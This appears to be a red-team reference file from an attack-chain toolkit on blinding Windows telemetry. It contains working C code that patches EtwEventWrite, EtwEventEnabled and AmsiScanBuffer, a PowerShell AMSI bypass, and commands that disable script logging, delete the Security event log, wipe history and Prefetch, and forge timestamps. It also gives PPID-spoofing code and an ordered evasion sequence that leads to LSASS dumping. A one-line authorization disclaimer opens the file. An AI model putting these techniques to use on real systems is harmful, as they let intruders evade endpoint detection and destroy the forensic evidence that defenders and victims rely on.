# Telemetry Blinding: ETW / AMSI / Anti-Forensics

> Only for authorized red team / adversary exercises / testing your own products; use against unauthorized targets is forbidden.

EDR detection depends heavily on two telemetry pipelines: ETW (Event Tracing for Windows) and AMSI (Antimalware Scan Interface).
This document summarizes red team countermeasures against these two pipelines and adds anti-forensics combinations such as Sysmon / PowerShell logging / timestamp spoofing.

Maps to MITRE ATT&CK: T1562.001 / T1562.002 / T1562.006 / T1070 / T1027.

## 1. ETW internals

ETW is the high-performance event tracing framework built into Windows, and EDRs use it for "lightweight kernel telemetry".
The providers the red team cares about most:

| Provider GUID | Name | Who uses it |
|--------------|------|--------|
| `{F4E1897C-BB5D-5668-F1D8-040F4D8DD344}` | Microsoft-Windows-Threat-Intelligence (ETW-TI) | Defender, MDE, third-party EDRs |
| `{A0C1853B-5C40-4B15-8766-3CF1C58F985A}` | Microsoft-Antimalware-Scan-Interface | Defender AMSI reporting |
| `{22FB2CD6-0E7B-422B-A0C7-2FAD1FD0E716}` | Microsoft-Windows-Kernel-Process | Basic process / thread events |
| `{2839FF94-8F12-4E1B-82E3-AF7AF77A450F}` | Microsoft-Windows-DotNETRuntime | .NET loading, JIT |
| `{E13C0D23-CCBC-4E12-931B-D9CC2EEE27E4}` | .NET CLR | CLR startup |

### Key user-mode APIs

| API | DLL | Role |
|-----|-----|------|
| `EtwEventWrite` | `ntdll.dll` | Write events (most used) |
| `EtwEventWriteFull` | `ntdll.dll` | Events with an activity ID |
| `EtwEventWriteEx` | `ntdll.dll` | Extended version |
| `NtTraceEvent` | `ntdll.dll` | Underlying EtwEventWrite |
| `NtTraceControl` | `ntdll.dll` | Control trace sessions (start/stop/query providers) |
| `EtwEventEnabled` | `ntdll.dll` | Whether the provider is enabled |
| `EtwEventRegister` | `ntdll.dll` | Register a provider |

### Call chain

```text
Application code EventWrite(...)
  → Microsoft wrapper (TraceLogging API)
  → ntdll!EtwEventWrite[Full|Ex]
  → ntdll!NtTraceEvent (syscall)
  → nt!NtTraceEvent (kernel)
  → kernel ETW core → consumers (EDR user-mode processes subscribe to sessions)
```

## 2. Three ETW patch methods

### Method A: EtwEventWrite head patch

Change the entry of `ntdll!EtwEventWrite` to return success immediately:

```text
Original:
  4C 8B DC                 mov r11, rsp
  48 81 EC 88 00 00 00     sub rsp, 88h
  ...

After the patch (x64):
  33 C0                    xor eax, eax       ; STATUS_SUCCESS = 0
  C3                       ret
```

C code:

```c
#include <windows.h>

BOOL PatchEtwEventWrite(void) {
    HMODULE hNtdll = GetModuleHandleA("ntdll.dll");
    if (!hNtdll) return FALSE;

    FARPROC pEtw = GetProcAddress(hNtdll, "EtwEventWrite");
    if (!pEtw) return FALSE;

    BYTE patch[] = { 0x33, 0xC0, 0xC3 };   // xor eax,eax; ret
    DWORD oldProt = 0;

    // Note: VirtualProtect itself may be hooked -> use the indirect syscall version
    if (!VirtualProtect(pEtw, sizeof(patch), PAGE_EXECUTE_READWRITE, &oldProt))
        return FALSE;

    memcpy(pEtw, patch, sizeof(patch));

    VirtualProtect(pEtw, sizeof(patch), oldProt, &oldProt);
    return TRUE;
}
```

**OPSEC warning**: writing to ntdll memory is itself a source of the `ALPC_MODIFY_PROCESS` / `PROTECTVM` events that ETW-TI monitors.
You must **first use an indirect syscall + bypass the NtProtectVirtualMemory hook, then patch**,
otherwise the EDR receives the alert before the patch takes effect.

### Method B: EtwEventEnabled always-false

Stealthier: leave `EtwEventWrite` unchanged and make `EtwEventEnabled` always return FALSE,
so the application layer decides by itself that "the provider is off" → never calls `EtwEventWrite`; friendlier to in-memory hash integrity checks (many EDRs verify the `EtwEventWrite` bytes).

```c
// EtwEventEnabled usually returns BOOLEAN (1 byte)
BYTE patch[] = { 0x32, 0xC0, 0xC3 };   // xor al,al; ret
```

### Method C: NtTraceControl disables the provider

Close the EDR session directly with a syscall (intrusive, but ntdll bytes stay untouched):

```c
// NtTraceControl(EtwpStopTrace, ...)
// Needs SeSystemProfilePrivilege or higher
// Suited to Local Admin + after a UAC bypass
```

Rarely used in practice, because:

- Closing the session itself triggers an "ETW provider stopped" event that another pipeline notices
- It needs high privileges

### Method D: kernel-mode ETW patch (only with existing BYOVD/kernel read-write)

```text
nt!EtwpEventTracingProviderEnableInfo
nt!EtwThreatIntProvRegHandle
Set it to 0 directly so every ETW-TI event is dropped
```

Belongs to the BYOVD phase of attack-chain; this skill does not go deeper.

## 3. AMSI Bypass

AMSI is the interface Windows provides so PowerShell / .NET / WMI / VBA run an antivirus scan before executing scripts.
The red team meets PowerShell + AMSI most often.

### Classic AmsiScanBuffer patch

```c
// Write at the entry of amsi.dll!AmsiScanBuffer:
//   mov eax, 0x80070057     ; E_INVALIDARG
//   ret 4                    ; (32-bit) or ret (64-bit)

BOOL PatchAmsi(void) {
    HMODULE h = LoadLibraryA("amsi.dll");
    if (!h) return FALSE;
    FARPROC p = GetProcAddress(h, "AmsiScanBuffer");
    if (!p) return FALSE;

    BYTE patch64[] = {
        0xB8, 0x57, 0x00, 0x07, 0x80,   // mov eax, 0x80070057
        0xC3                              // ret
    };
    DWORD old = 0;
    VirtualProtect(p, sizeof(patch64), PAGE_EXECUTE_READWRITE, &old);
    memcpy(p, patch64, sizeof(patch64));
    VirtualProtect(p, sizeof(patch64), old, &old);
    return TRUE;
}
```

PowerShell one-liner version (for detection countermeasure reference only; it is itself caught by signatures / Defender):

```powershell
# Concept demo; a real environment must combine it with obfuscation / HWBP
[Ref].Assembly.GetType('System.Management.Automation.'+$([char]65+'msi'+'Utils')).GetField($([char]97+'msiInitFailed'),'NonPublic,Static').SetValue($null,$true)
```

### Advanced option 1: Hardware Breakpoint AMSI Bypass

Leaves amsi.dll memory untouched (does not trigger integrity scans):

1. AddVectoredExceptionHandler
2. Set `DR0` at the `AmsiScanBuffer` entry
3. When the VEH hits, set `RAX = 0x80070057`, `RIP = address of a ret instruction`, `RSP += 8`
4. ContinueExecution

Same infrastructure as the HWBP Blindside in unhook-techniques.md; the VEH can be shared.

### Advanced option 2: corrupt AmsiContext / AmsiSession

Build a malformed `AmsiContext` structure so `AmsiScanBuffer` returns success early because its internal check fails:

```text
// The AmsiContext header should be the "AMSI" magic
// Change it to "XXXX" → the internal AmsiScanBuffer check fails but returns S_OK + AMSI_RESULT_CLEAN
```

### Advanced option 3: reflectively load a copy of amsi.dll

Instead of the system amsi.dll, reflectively load a clean copy into your own process and redirect the PowerShell engine's AMSI calls.
Suited to advanced EDRs that already intercept PowerShell.exe at load time.

## 4. Anti-forensics: removing traces

### Disable PowerShell ScriptBlock Logging

```powershell
# Registry (needs administrator)
Set-ItemProperty -Path 'HKLM:\SOFTWARE\Policies\Microsoft\Windows\PowerShell\ScriptBlockLogging' `
    -Name 'EnableScriptBlockLogging' -Value 0 -Force

Set-ItemProperty -Path 'HKLM:\SOFTWARE\Policies\Microsoft\Windows\PowerShell\ModuleLogging' `
    -Name 'EnableModuleLogging' -Value 0 -Force

Set-ItemProperty -Path 'HKLM:\SOFTWARE\Policies\Microsoft\Windows\PowerShell\Transcription' `
    -Name 'EnableTranscripting' -Value 0 -Force

# Group Policy path:
# Computer Configuration → Administrative Templates → Windows Components →
#   Windows PowerShell → Turn on PowerShell Script Block Logging = Disabled
```

### Clear PowerShell history

```powershell
# Current session
Clear-History
# Persistent history (PSReadLine)
Remove-Item (Get-PSReadLineOption).HistorySavePath -Force -ErrorAction SilentlyContinue
```

### Clear Prefetch

```powershell
# Needs SYSTEM
Remove-Item 'C:\Windows\Prefetch\implant*.pf' -Force
# Clear everything (big action, use with care)
# Remove-Item 'C:\Windows\Prefetch\*.pf' -Force
```

### Clear ETL logs

```powershell
# Stop the session, then delete the etl
logman stop "EventLog-Security" -ets
Remove-Item 'C:\Windows\System32\winevt\Logs\Security.evtx' -Force -ErrorAction SilentlyContinue
# Note: deleting .evtx directly makes the Event Log Service recreate it and write a "log cleared" event (Event ID 1102)
# Stealthier: patch the EventLog API of wevtsvc.dll in memory (T1070.001)
```

### Timestamp spoof (T1070.006)

```powershell
$f = 'C:\Windows\Temp\implant.dll'
$ref = 'C:\Windows\System32\notepad.exe'
(Get-Item $f).CreationTime   = (Get-Item $ref).CreationTime
(Get-Item $f).LastWriteTime  = (Get-Item $ref).LastWriteTime
(Get-Item $f).LastAccessTime = (Get-Item $ref).LastAccessTime
```

## 5. Evading Sysmon monitoring

Sysmon is the most common free telemetry in the community (many enterprises use the olaf configuration).
Key events:

| Event ID | Meaning |
|----------|------|
| 1 | ProcessCreate (with PPID, CommandLine, Hash) |
| 7 | ImageLoad (DLL loading) |
| 8 | CreateRemoteThread |
| 10 | ProcessAccess (OpenProcess) |
| 11 | FileCreate |
| 12/13/14 | Registry |
| 22 | DNS Query |
| 25 | ProcessTampering (image hollowing) |

### Evasion approach

1. **Do not create new processes**: act entirely inside already-injected processes to avoid Event ID 1
2. **PPID spoof**: use `UpdateProcThreadAttribute(PROC_THREAD_ATTRIBUTE_PARENT_PROCESS)` to set the PPID to `explorer.exe`, so Sysmon ProcessCreate looks legitimate

```c
STARTUPINFOEX si = {0};
PROCESS_INFORMATION pi = {0};
SIZE_T size = 0;
HANDLE hParent = OpenProcess(PROCESS_CREATE_PROCESS, FALSE, g_explorerPid);

si.StartupInfo.cb = sizeof(STARTUPINFOEX);
InitializeProcThreadAttributeList(NULL, 1, 0, &size);
si.lpAttributeList = (LPPROC_THREAD_ATTRIBUTE_LIST)HeapAlloc(GetProcessHeap(), 0, size);
InitializeProcThreadAttributeList(si.lpAttributeList, 1, 0, &size);
UpdateProcThreadAttribute(si.lpAttributeList, 0,
    PROC_THREAD_ATTRIBUTE_PARENT_PROCESS, &hParent, sizeof(HANDLE), NULL, NULL);

CreateProcessW(L"C:\\Windows\\System32\\notepad.exe", NULL, NULL, NULL, FALSE,
    EXTENDED_STARTUPINFO_PRESENT, NULL, NULL, &si.StartupInfo, &pi);
```

3. **Unbacked memory + untouched image**: Process Hollowing is already caught by Event ID 25 in new Sysmon versions.
   Prefer **module stomping** (overwrite a section of a loaded legitimate DLL) or newer techniques such as **dirty vanity**,
   combined with PPID spoof
4. **No remote threads**: avoid Event ID 8; execute in your own process with `NtCreateThreadEx` / APC / Early Bird APC
5. **DNS over DoH / HTTPS**: avoid Event ID 22

## 6. Call stack spoof + timestamps make events look like legitimate software

Even when ProcessCreate cannot be avoided (for example a scenario that must spawn a child), you can:

- Change the CommandLine to a format similar to some legitimate software
- PPID spoof to services.exe (disguise as a service started by the SCM)
- Change the image hash that ImageLoad sees: put the implant code into the memory space of a signed DLL through module stomping
- Combine with CallStackSpoofer: even with EnableCallTracing on, Sysmon cannot see the implant frames

## 7. Practical OPSEC: order of operations

**In the wrong order the EDR receives an alert first**, and later actions get cut off directly.

Correct order:

```text
1. AMSI bypass (HWBP first, avoid writing to amsi.dll)
   ─── so .NET / PowerShell are not scanned while loading the implant
2. ETW patch (patch EtwEventWrite first, before any syscall)
   ─── turn off telemetry for your own later actions
3. Call NtProtectVirtualMemory through an indirect syscall
   ─── prepare a "safe" channel for memory protection changes
4. Unhook ntdll (Peruns Fart) or enable indirect syscalls
   ─── wipe user-mode hooks
5. Call stack spoof setup
   ─── prepare the fake stack for every later syscall
6. Actual payload execution (injection / lateral movement / LSASS dump)
7. Clean traces (PowerShell history / Prefetch / timestamps)
```

Wrong order examples:

```text
❌ Unhook ntdll first → ETW-TI immediately reports PROTECTVM + module modification → the SOC already has the alert
❌ Dump LSASS first → AMSI / ETW not suppressed yet → high-confidence T1003.001 alert
✅ AMSI → ETW → unhook → spoof → payload
```

## References

- ETW Threat Intelligence Provider: <https://learn.microsoft.com/en-us/windows/win32/etw/event-tracing-portal>
- ETW patching overview: <https://www.mdsec.co.uk/2020/03/hiding-your-net-etw/>
- AMSI bypass collection: <https://github.com/S3cur3Th1sSh1t/Amsi-Bypass-Powershell>
- Sysmon olaf configuration: <https://github.com/olafhartong/sysmon-modular>
- PPID Spoofing: <https://blog.didierstevens.com/2017/03/20/>
- Ekko sleep mask: <https://github.com/Cracked5pider/Ekko>
- Foliage sleep obfuscation: <https://github.com/SecIdiot/FOLIAGE>
- MITRE T1562.002 (Disable Windows Event Logging): <https://attack.mitre.org/techniques/T1562/002/>
- MITRE T1562.006 (Indicator Blocking): <https://attack.mitre.org/techniques/T1562/006/>
- MITRE T1070 (Indicator Removal): <https://attack.mitre.org/techniques/T1070/>

## Routing callback

After this set of three (hook survey → unhook → telemetry blinding), return to `SKILL.md` Step 5 to verify in the sandbox,
then enter the next phase through the initial access and lateral movement sections of `attack-chain/`.
